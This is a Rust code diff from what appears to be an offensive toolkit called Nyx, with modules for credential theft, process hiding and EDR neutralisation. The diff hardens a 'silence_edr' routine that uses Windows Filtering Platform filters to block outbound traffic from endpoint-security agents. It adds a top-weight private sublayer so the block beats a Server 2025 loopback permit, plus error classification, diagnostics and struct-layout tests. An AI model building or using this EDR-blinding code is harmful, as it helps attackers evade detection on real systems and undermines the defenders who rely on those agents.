@@ -32,6 +32,7 @@ use crate::pagewalk::PhysRead;
 use crate::persistence::ProcessHider;
 use crate::{CredKit, EdrNeutralizeKit, KernelRw, KitError, NeutralizeMethod, WfpKit};
 use alloc::format;
+use alloc::string::String;
 use alloc::vec::Vec;
 
 // ---- KernelRw address-space contract (kernelsdk-2-1) -----------------------
@@ -168,6 +169,100 @@ impl UserModeEdrSilencer {
     }
 }
 
+/// `FWPM_SESSION_FLAG_DYNAMIC` — session owns its objects; close / process
+/// death removes them. Public so diagnostics can report the flags the kit
+/// actually requested (the no-residue contract only holds for DYNAMIC).
+pub const WFP_SESSION_FLAG_DYNAMIC: u32 = 0x1;
+
+/// Highest sublayer weight (`UINT16`). Higher-weighted sublayers are invoked
+/// first; a BLOCK in our own sublayer then vetoes a PERMIT in Windows'
+/// default/UNIVERSAL sublayer (the AppContainerLoopback IsLoopback PERMIT
+/// that can otherwise win auto-weight arbitration on Server 2025).
+pub const WFP_SUBLAYER_WEIGHT: u16 = 0xFFFF;
+
+/// `FWP_UINT8` weight range 15 — highest BFE-computed range inside the
+/// sublayer. We own the sublayer, so this is belt-and-suspenders against a
+/// second filter landing in the same sublayer.
+#[cfg(any(target_os = "windows", test))]
+const FWP_UINT8: u32 = 1;
+#[cfg(any(target_os = "windows", test))]
+const FWP_FILTER_WEIGHT_MAX_RANGE: u64 = 15;
+
+/// `FWP_E_ALREADY_EXISTS` — leftover sublayer from a previous (non-DYNAMIC)
+/// session; we still add filters under the well-known Nyx GUID.
+#[cfg(target_os = "windows")]
+const FWP_E_ALREADY_EXISTS: u32 = 0x8032_0009;
+
+/// Classify a `FwpmEngineOpen0` / `FwpmFilterAdd0` / `FwpmSubLayerAdd0` DWORD
+/// as an **environment limit** (skip) rather than a product failure.
+///
+/// Hosted Server 2025 / Session-0 runners can lack admin or have BFE stopped;
+/// those statuses must not be recorded as `blocked=false`. Product bugs
+/// (`FWP_E_NULL_DISPLAY_NAME` 0x80320023, invalid layout, …) return `None`.
+pub fn wfp_status_env_limit(st: u32) -> Option<&'static str> {
+    // HRESULT_FROM_WIN32(x) = 0x80070000 | (x & 0xFFFF). Fwpm* returns either
+    // a raw Win32 code or that HRESULT; collapse both.
+    let code = if st & 0xFFFF_0000 == 0x8007_0000 {
+        st & 0xFFFF
+    } else {
+        st
+    };
+    match code {
+        5 => Some("access denied (not admin)"),
+        1058 => Some("BFE service disabled"),
+        1062 => Some("BFE service not active"),
+        1717 => Some("BFE RPC unknown interface"),
+        1722 => Some("BFE RPC unavailable (service stopped)"),
+        1726 => Some("BFE RPC call failed (service stopped)"),
+        1753 => Some("BFE RPC endpoint not registered (service stopped)"),
+        _ => None,
+    }
+}
+
+/// True when a [`KitError`] from the WFP path is an environment skip
+/// (`env_limit:…`), not a filter/layout product failure.
+pub fn wfp_error_is_env_limit(err: &KitError) -> Option<&str> {
+    match err {
+        KitError::Other(s) => s.strip_prefix("env_limit:"),
+        _ => None,
+    }
+}
+
+#[cfg(target_os = "windows")]
+fn wfp_kit_error(op: &str, st: u32) -> KitError {
+    match wfp_status_env_limit(st) {
+        Some(why) => KitError::Other(format!("env_limit:{why} ({op}={st})")),
+        None => KitError::Other(format!("{op} failed: {st}")),
+    }
+}
+
+#[cfg(target_os = "windows")]
+fn wfp_unresolved(sym: &'static str) -> KitError {
+    KitError::Other(format!(
+        "env_limit:fwpuclnt.dll missing or {sym} unresolved"
+    ))
+}
+
+/// Compare two Win32 / NT-ish image paths the way AppId matching cares:
+/// case-insensitive, slash-normalized, `\\?\` prefix stripped. Empty paths
+/// never match (a failed resolve is not "equal").
+pub fn wfp_image_paths_equal(a: &str, b: &str) -> bool {
+    fn norm(s: &str) -> String {
+        let s = s.trim();
+        let s = s
+            .strip_prefix(r"\\?\")
+            .or_else(|| s.strip_prefix("//?/"))
+            .unwrap_or(s);
+        let mut out = String::new();
+        for c in s.chars() {
+            let c = if c == '/' { '\\' } else { c };
+            out.push(c.to_ascii_lowercase());
+        }
+        out
+    }
+    !a.is_empty() && !b.is_empty() && norm(a) == norm(b)
+}
+
 impl WfpKit for UserModeEdrSilencer {
     fn silence_edr(&self, edr_pids: &[u32]) -> Result<WfpSilenceGuard, KitError> {
         let rules = Self::rules_for(edr_pids);
@@ -210,6 +305,12 @@ pub struct WfpSilenceGuard {
     /// The filter IDs added under this session. Diagnostic only — close-on-drop
     /// removes ALL session-scoped filters, we don't delete them one-by-one.
     filter_ids: Vec<u64>,
+    /// Session flags passed to `FwpmEngineOpen0` (always DYNAMIC).
+    session_flags: u32,
+    /// `FWP_BYTE_BLOB.size` of each resolved AppId (0 on the floor).
+    app_id_blob_lens: Vec<u32>,
+    /// Win32 image paths `QueryFullProcessImageNameW` returned per PID.
+    image_paths: Vec<String>,
 }
 
 // SAFETY: the engine handle is owned exclusively by this guard. WFP's user-mode
@@ -256,6 +357,21 @@ impl WfpSilenceGuard {
     /// Number of block filters this session installed. 0 on the non-Windows floor.
     pub fn filter_count(&self) -> usize {
         self.filter_ids.len()
+    }
+
+    /// Flags requested at `FwpmEngineOpen0` (0 on the floor).
+    pub fn session_flags(&self) -> u32 {
+        self.session_flags
+    }
+
+    /// AppId blob sizes in the same order as [`Self::filter_ids`].
+    pub fn app_id_blob_lens(&self) -> &[u32] {
+        &self.app_id_blob_lens
+    }
+
+    /// Resolved image paths in the same order as [`Self::filter_ids`].
+    pub fn image_paths(&self) -> &[String] {
+        &self.image_paths
     }
 }
 
@@ -322,13 +438,13 @@ fn wfp_open_silence_session(rules: &[WfpBlockRule]) -> Result<WfpSilenceGuard, K
         *mut u64,                 // id (OUT)
     ) -> u32;
 
-    // Resolve from fwpuclnt.dll.
+    // Resolve from fwpuclnt.dll. Missing BFE client DLL is an env skip.
     let open: FwpmEngineOpen0 =
         unsafe { crate::win::resolve::resolve_sym(b"fwpuclnt.dll", b"FwpmEngineOpen0") }
-            .map_err(|_| KitError::Other("FwpmEngineOpen0 unresolved".into()))?;
+            .map_err(|_| wfp_unresolved("FwpmEngineOpen0"))?;
     let add: FwpmFilterAdd0 =
         unsafe { crate::win::resolve::resolve_sym(b"fwpuclnt.dll", b"FwpmFilterAdd0") }
-            .map_err(|_| KitError::Other("FwpmFilterAdd0 unresolved".into()))?;
+            .map_err(|_| wfp_unresolved("FwpmFilterAdd0"))?;
 
     // 1. Open engine session — MUST be **dynamic**: filters added on the
     // default (session=NULL) session are PERSISTENT and survive
@@ -353,7 +469,8 @@ fn wfp_open_silence_session(rules: &[WfpBlockRule]) -> Result<WfpSilenceGuard, K
         )
     };
     if st != 0 {
-        return Err(KitError::Other(format!("FwpmEngineOpen0 failed: {}", st)));
+        // Access denied / BFE stopped → env_limit, not a product failure.
+        return Err(wfp_kit_error("FwpmEngineOpen0", st));
     }
 
     // Build the guard up-front. On ANY error below we `?`-return, which drops
@@ -364,7 +481,15 @@ fn wfp_open_silence_session(rules: &[WfpBlockRule]) -> Result<WfpSilenceGuard, K
     let mut guard = WfpSilenceGuard {
         engine_handle,
         filter_ids: Vec::with_capacity(rules.len()),
+        session_flags: WFP_SESSION_FLAG_DYNAMIC,
+        app_id_blob_lens: Vec::with_capacity(rules.len()),
+        image_paths: Vec::with_capacity(rules.len()),
     };
+
+    // Own high-weight sublayer so a Server 2025 default-sublayer loopback
+    // PERMIT cannot out-arbitrate our BLOCK (GUID_NULL = UNIVERSAL, auto
+    // weight lost to AppContainerLoopback IsLoopback PERMIT).
+    wfp_add_nyx_sublayer(guard.engine_handle)?;
 
     // 2. Add an AppId-conditioned block filter for each EDR PID (outbound, IPv4).
     for rule in rules {
@@ -387,15 +512,44 @@ fn wfp_open_silence_session(rules: &[WfpBlockRule]) -> Result<WfpSilenceGuard, K
         };
         if st != 0 {
             // `guard` is dropped here → session closes → partial filters removed.
-            return Err(KitError::Other(format!(
-                "FwpmFilterAdd0 failed for pid {}: {}",
-                rule.pid, st
-            )));
+            return Err(match wfp_status_env_limit(st) {
+                Some(why) => KitError::Other(format!(
+                    "env_limit:{why} (FwpmFilterAdd0 pid {}={})",
+                    rule.pid, st
+                )),
+                None => KitError::Other(format!(
+                    "FwpmFilterAdd0 failed for pid {}: {}",
+                    rule.pid, st
+                )),
+            });
         }
         guard.filter_ids.push(filter_id);
+        guard.app_id_blob_lens.push(prepared.app_id_len);
+        guard.image_paths.push(prepared.image_path.clone());
     }
 
     Ok(guard)
+}
+
+/// Add the well-known Nyx sublayer (weight `0xFFFF`, never PERSISTENT) under
+/// the current DYNAMIC session. `FWP_E_ALREADY_EXISTS` is ignored so a
+/// leftover GUID from the 2026-08-16 non-DYNAMIC bug is still usable.
+#[cfg(target_os = "windows")]
+fn wfp_add_nyx_sublayer(engine: *mut core::ffi::c_void) -> Result<(), KitError> {
+    type FwpmSubLayerAdd0 = unsafe extern "system" fn(
+        *mut core::ffi::c_void,
+        *const FwpmSubLayer0,
+        *const core::ffi::c_void,
+    ) -> u32;
+    let add: FwpmSubLayerAdd0 =
+        unsafe { crate::win::resolve::resolve_sym(b"fwpuclnt.dll", b"FwpmSubLayerAdd0") }
+            .map_err(|_| wfp_unresolved("FwpmSubLayerAdd0"))?;
+    let sub = FwpmSubLayer0::nyx();
+    let st = unsafe { add(engine, &sub, core::ptr::null()) };
+    if st != 0 && st != FWP_E_ALREADY_EXISTS {
+        return Err(wfp_kit_error("FwpmSubLayerAdd0", st));
+    }
+    Ok(())
 }
 
 #[cfg(not(target_os = "windows"))]
@@ -432,6 +586,14 @@ const LAYER_ALE_AUTH_CONNECT_V4: Guid = Guid([
 #[cfg(any(target_os = "windows", test))]
 const CONDITION_ALE_APP_ID: Guid = Guid([
     0x87, 0x1E, 0x8E, 0xD7, 0x44, 0x86, 0xA5, 0x4E, 0x94, 0x37, 0xD8, 0x09, 0xEC, 0xEF, 0xC9, 0x71,
+]);
+
+/// Nyx WFP silencer sublayer. `{5e9c3a1b-4d7f-4a2e-9b18-7c4e59574e58}`.
+/// Not a Microsoft well-known GUID — filters land here instead of
+/// `GUID_NULL`/UNIVERSAL so a default-sublayer loopback PERMIT cannot win.
+#[cfg(any(target_os = "windows", test))]
+const NYX_WFP_SUBLAYER: Guid = Guid([
+    0x1B, 0x3A, 0x9C, 0x5E, 0x7F, 0x4D, 0x2E, 0x4A, 0x9B, 0x18, 0x7C, 0x4E, 0x59, 0x57, 0x4E, 0x58,
 ]);
 
 /// FWP_MATCH_EQUAL — exact-match condition.
@@ -517,11 +679,6 @@ struct FwpmSession0 {
     _pad1: u32,
 }
 
-/// FWPM_SESSION_FLAG_DYNAMIC — session owns its objects; close/process-death
-/// removes them (the no-residue contract).
-#[cfg(any(target_os = "windows", test))]
-const FWPM_SESSION_FLAG_DYNAMIC: u32 = 0x1;
-
 #[cfg(any(target_os = "windows", test))]
 impl FwpmSession0 {
     fn dynamic(process_id: u32) -> Self {
@@ -534,7 +691,7 @@ impl FwpmSession0 {
             session_key: Guid([0; 16]),
             display_name: SESSION_NAME.as_ptr(),
             display_desc: core::ptr::null(),
-            flags: FWPM_SESSION_FLAG_DYNAMIC,
+            flags: WFP_SESSION_FLAG_DYNAMIC,
             txn_wait_ms: 0,
             process_id,
             _pad0: 0,
@@ -542,6 +699,55 @@ impl FwpmSession0 {
             username: core::ptr::null_mut(),
             kernel_mode: 0,
             _pad1: 0,
+        }
+    }
+}
+
+/// FWPM_SUBLAYER0 — SDK x64 layout (72 bytes). `flags` is UINT32 (not UINT16).
+/// Per-field offsets pinned by `wfp_sublayer0_layout_matches_sdk`:
+/// ```text
+///   0   subLayerKey    GUID
+///   16  displayData    { wchar_t* name; wchar_t* desc }
+///   32  flags          UINT32   (never PERSISTENT)
+///   40  providerKey    GUID*
+///   48  providerData   FWP_BYTE_BLOB
+///   64  weight         UINT16
+/// ```
+#[cfg(any(target_os = "windows", test))]
+#[repr(C)]
+struct FwpmSubLayer0 {
+    sublayer_key: Guid,
+    display_name: *const u16,
+    display_desc: *const u16,
+    flags: u32,
+    _pad0: u32,
+    provider_key: *const Guid,
+    provider_data: FwpByteBlob,
+    weight: u16,
+    _pad1: [u16; 3],
+}
+
+#[cfg(any(target_os = "windows", test))]
+impl FwpmSubLayer0 {
+    fn nyx() -> Self {
+        // "NyxWfpSub\0" UTF-16 — static, outlives FwpmSubLayerAdd0.
+        static NAME: [u16; 10] = [
+            'N' as u16, 'y' as u16, 'x' as u16, 'W' as u16, 'f' as u16, 'p' as u16, 'S' as u16,
+            'u' as u16, 'b' as u16, 0,
+        ];
+        FwpmSubLayer0 {
+            sublayer_key: NYX_WFP_SUBLAYER,
+            display_name: NAME.as_ptr(),
+            display_desc: core::ptr::null(),
+            flags: 0,
+            _pad0: 0,
+            provider_key: core::ptr::null(),
+            provider_data: FwpByteBlob {
+                size: 0,
+                data: core::ptr::null_mut(),
+            },
+            weight: WFP_SUBLAYER_WEIGHT,
+            _pad1: [0; 3],
         }
     }
 }
@@ -580,9 +786,9 @@ struct FwpmFilter0 {
     provider_key: *const Guid, // 40: null
     provider_data: FwpByteBlob, // 48: empty
     layer_key: Guid,          // 64: FWPM_LAYER_ALE_AUTH_CONNECT_V4
-    sublayer_key: Guid,       // 80: zero = default sublayer
-    weight_type: u32,         // 96: FWP_VALUE0.type = FWP_EMPTY (0) → auto weight
-    weight_value: u64,        // 104: FWP_VALUE0 union (unused)
+    sublayer_key: Guid,       // 80: NYX_WFP_SUBLAYER (never GUID_NULL/UNIVERSAL)
+    weight_type: u32,         // 96: FWP_UINT8 — highest range inside our sublayer
+    weight_value: u64,        // 104: FWP_VALUE0 union (uint8 in the low byte)
     num_filter_conditions: u32, // 112: ALWAYS 1 — see P0-9 below
     filter_conditions: *const FwpmFilterCondition0, // 120
     action_type: u32,         // 128: FWPM_ACTION0.type = FWP_ACTION_BLOCK
@@ -632,9 +838,9 @@ impl FwpmFilter0 {
                 data: core::ptr::null_mut(),
             },
             layer_key: LAYER_ALE_AUTH_CONNECT_V4,
-            sublayer_key: Guid([0; 16]),
-            weight_type: 0,
-            weight_value: 0,
+            sublayer_key: NYX_WFP_SUBLAYER,
+            weight_type: FWP_UINT8,
+            weight_value: FWP_FILTER_WEIGHT_MAX_RANGE,
             num_filter_conditions: 1,
             filter_conditions: conditions,
             action_type: FWP_ACTION_BLOCK,
@@ -708,6 +914,15 @@ fn resolve_image_path_wide(pid: u32) -> Result<Vec<u16>, KitError> {
     Ok(path)
 }
 
+#[cfg(target_os = "windows")]
+fn wide_nul_to_string(w: &[u16]) -> String {
+    let n = w.iter().position(|&c| c == 0).unwrap_or(w.len());
+    w[..n]
+        .iter()
+        .map(|&c| char::from_u32(c as u32).unwrap_or('\u{FFFD}'))
+        .collect()
+}
+
 /// Owned AppId blob returned by `FwpmGetAppIdFromFileName0`. The BFE allocates
 /// it, so it MUST be released with `FwpmFreeMemory0` (not the process heap) —
 /// the Drop impl does exactly that. Keep it alive until `FwpmFilterAdd0` has
@@ -720,25 +935,31 @@ struct AppIdBlob {
 #[cfg(target_os = "windows")]
 impl AppIdBlob {
     /// pid → image path → AppId blob. Any failure returns `Err` before a blob
-    /// exists — there is no fallback path.
-    fn for_pid(pid: u32) -> Result<Self, KitError> {
+    /// exists — there is no fallback path. Also returns the Win32 image path
+    /// and the BFE blob size for live diagnostics.
+    fn for_pid(pid: u32) -> Result<(Self, String, u32), KitError> {
         type FwpmGetAppIdFromFileName0Fn =
             unsafe extern "system" fn(*const u16, *mut *mut FwpByteBlob) -> u32;
         let get_app_id: FwpmGetAppIdFromFileName0Fn = unsafe {
             crate::win::resolve::resolve_sym(b"fwpuclnt.dll", b"FwpmGetAppIdFromFileName0")
         }
-        .map_err(|_| KitError::Other("FwpmGetAppIdFromFileName0 unresolved".into()))?;
+        .map_err(|_| wfp_unresolved("FwpmGetAppIdFromFileName0"))?;
 
         let path = resolve_image_path_wide(pid)?;
         let mut blob: *mut FwpByteBlob = core::ptr::null_mut();
         let st = unsafe { get_app_id(path.as_ptr(), &mut blob) };
         if st != 0 || blob.is_null() {
-            return Err(KitError::Other(format!(
-                "FwpmGetAppIdFromFileName0 failed for pid {}: {}",
-                pid, st
-            )));
+            return Err(match wfp_status_env_limit(st) {
+                Some(why) => KitError::Other(format!(
+                    "env_limit:{why} (FwpmGetAppIdFromFileName0 pid {pid}={st})"
+                )),
+                None => KitError::Other(format!(
+                    "FwpmGetAppIdFromFileName0 failed for pid {pid}: {st}"
+                )),
+            });
         }
-        Ok(Self { blob })
+        let len = unsafe { (*blob).size };
+        Ok((Self { blob }, wide_nul_to_string(&path), len))
     }
 }
 
@@ -781,14 +1002,21 @@ struct PreparedFilter {
     #[allow(dead_code)]
     app_id: AppIdBlob,
     condition: FwpmFilterCondition0,
+    image_path: String,
+    app_id_len: u32,
 }
 
 #[cfg(target_os = "windows")]
 impl PreparedFilter {
     fn block_outbound_for_pid(pid: u32) -> Result<Self, KitError> {
-        let app_id = AppIdBlob::for_pid(pid)?;
+        let (app_id, image_path, app_id_len) = AppIdBlob::for_pid(pid)?;
         let condition = ale_app_id_condition(app_id.blob);
-        Ok(Self { app_id, condition })
+        Ok(Self {
+            app_id,
+            condition,
+            image_path,
+            app_id_len,
+        })
     }
 
     /// The `FWPM_FILTER0` to hand to `FwpmFilterAdd0`. Borrows
@@ -1728,9 +1956,9 @@ mod tests {
         assert_eq!(core::mem::offset_of!(FwpmSession0, process_id), 40);
         assert_eq!(core::mem::offset_of!(FwpmSession0, sid), 48);
         assert_eq!(core::mem::offset_of!(FwpmSession0, kernel_mode), 64);
-        assert_eq!(FWPM_SESSION_FLAG_DYNAMIC, 0x1);
+        assert_eq!(WFP_SESSION_FLAG_DYNAMIC, 0x1);
         let s = FwpmSession0::dynamic(1234);
-        assert_eq!(s.flags, FWPM_SESSION_FLAG_DYNAMIC);
+        assert_eq!(s.flags, WFP_SESSION_FLAG_DYNAMIC);
         assert_eq!(s.process_id, 1234);
         assert!(
             !s.display_name.is_null(),
@@ -1774,7 +2002,84 @@ mod tests {
         assert_eq!(filter.layer_key, LAYER_ALE_AUTH_CONNECT_V4);
         assert_eq!(filter.action_type, FWP_ACTION_BLOCK);
         assert_eq!(filter.flags, 0); // never PERSISTENT — session-scoped
-        assert_eq!(filter.weight_type, 0); // FWP_EMPTY → auto weight
+        assert_eq!(filter.sublayer_key, NYX_WFP_SUBLAYER);
+        assert_eq!(filter.weight_type, FWP_UINT8);
+        assert_eq!(filter.weight_value, FWP_FILTER_WEIGHT_MAX_RANGE);
+        assert!(!filter.display_name.is_null());
+    }
+
+    #[test]
+    fn wfp_filter0_field_offsets_match_sdk() {
+        assert_eq!(core::mem::offset_of!(FwpmFilter0, sublayer_key), 80);
+        assert_eq!(core::mem::offset_of!(FwpmFilter0, weight_type), 96);
+        assert_eq!(
+            core::mem::offset_of!(FwpmFilter0, num_filter_conditions),
+            112
+        );
+        assert_eq!(core::mem::offset_of!(FwpmFilter0, action_type), 128);
+    }
+
+    #[test]
+    fn wfp_sublayer0_layout_matches_sdk() {
+        assert_eq!(core::mem::size_of::<FwpmSubLayer0>(), 72);
+        assert_eq!(core::mem::offset_of!(FwpmSubLayer0, flags), 32);
+        assert_eq!(core::mem::offset_of!(FwpmSubLayer0, provider_key), 40);
+        assert_eq!(core::mem::offset_of!(FwpmSubLayer0, weight), 64);
+        let s = FwpmSubLayer0::nyx();
+        assert_eq!(s.weight, WFP_SUBLAYER_WEIGHT);
+        assert_eq!(s.flags, 0);
+        assert_eq!(s.sublayer_key, NYX_WFP_SUBLAYER);
+        assert!(!s.display_name.is_null());
+    }
+
+    #[test]
+    fn wfp_skip_vs_fail_classifies_engine_status() {
+        // Access denied / BFE down → env skip, not a product failure.
+        assert_eq!(wfp_status_env_limit(5), Some("access denied (not admin)"));
+        assert_eq!(
+            wfp_status_env_limit(0x8007_0005),
+            Some("access denied (not admin)")
+        );
+        assert_eq!(wfp_status_env_limit(1058), Some("BFE service disabled"));
+        assert_eq!(
+            wfp_status_env_limit(1722),
+            Some("BFE RPC unavailable (service stopped)")
+        );
+        assert_eq!(
+            wfp_status_env_limit(0x8007_06BA),
+            Some("BFE RPC unavailable (service stopped)")
+        );
+        assert_eq!(
+            wfp_status_env_limit(1753),
+            Some("BFE RPC endpoint not registered (service stopped)")
+        );
+        // Product bugs stay failures — FWP_E_NULL_DISPLAY_NAME (0x80320023).
+        assert_eq!(wfp_status_env_limit(0x8032_0023), None);
+        assert_eq!(wfp_status_env_limit(0), None);
+
+        let skip =
+            KitError::Other("env_limit:access denied (not admin) (FwpmEngineOpen0=5)".into());
+        assert!(wfp_error_is_env_limit(&skip).is_some());
+        let fail = KitError::Other("FwpmFilterAdd0 failed for pid 4: 2152202275".into());
+        assert!(wfp_error_is_env_limit(&fail).is_none());
+        let posture = KitError::UnsupportedPosture("no EDR PIDs provided");
+        assert!(wfp_error_is_env_limit(&posture).is_none());
+    }
+
+    #[test]
+    fn wfp_image_paths_equal_normalizes_win32_forms() {
+        assert!(wfp_image_paths_equal(
+            r"C:\Temp\nyx_wfp_probe_1.exe",
+            r"c:\temp\nyx_wfp_probe_1.exe"
+        ));
+        assert!(wfp_image_paths_equal(
+            r"\\?\C:\Temp\a.exe",
+            r"C:\Temp\a.exe"
+        ));
+        assert!(wfp_image_paths_equal(r"C:/Temp/a.exe", r"C:\Temp\a.exe"));
+        assert!(!wfp_image_paths_equal(r"C:\Temp\a.exe", r"C:\Temp\b.exe"));
+        assert!(!wfp_image_paths_equal("", r"C:\Temp\a.exe"));
+        assert!(!wfp_image_paths_equal(r"C:\Temp\a.exe", ""));
     }
 
     #[test]
